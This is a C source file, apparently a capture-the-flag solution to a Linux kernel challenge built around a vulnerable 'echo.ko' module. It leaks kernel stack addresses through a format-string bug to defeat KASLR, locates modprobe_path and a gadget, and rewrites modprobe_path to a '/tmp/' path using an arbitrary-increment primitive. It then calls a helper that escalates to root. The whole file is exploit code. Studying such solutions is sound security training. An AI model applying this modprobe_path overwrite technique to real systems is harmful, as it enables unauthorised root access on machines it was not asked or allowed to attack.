#include "libpwn.c"

int main(){
    //blasty's (Author) Solution https://plak.infrapuin.nl/1wy3985d.py
    fd = open_device();
    fmt_ptr = leak_stack(72) + 0x2600;
    size_t leak = leak_stack(82);

    kernel_base = leak - 0x3a59d6;
    modprobe_path = KADDR(0xffffffff828d2ee0);
    // 0xffffffff81218754 : mov rax, qword ptr [rdi + 0x38] ; inc qword ptr ds:[rax] ; xor eax, eax ; xor edi, edi ; ret
    mov_rax_qword_ptr_rdi_38 = KADDR(0xffffffff81218754);
    ret = KADDR(0xffffffff81218760);
    
    info("fmt@echo.ko", fmt_ptr);
    info("Kernel leak", leak);
    info("Kernel base", kernel_base);
    info("Modprobe path", modprobe_path);
    info("mov rax, qword ptr [rdi + 0x38]", mov_rax_qword_ptr_rdi_38);
    info("ret", ret);
    
    char *leakstring = leak_string(modprobe_path);
    puts(leakstring);
    hax_incr(modprobe_path + 1, 1); // s -> t
    hax_incr(modprobe_path + 2, 11); // b -> m
    hax_incr(modprobe_path + 3, 7); // i -> p
    hax_incr(modprobe_path + 4, 193); // n/ -> /0
    leakstring = leak_string(modprobe_path);
    puts(leakstring);
    // modprobe_attack_read("/flag");
    modprobe_attack_root();
}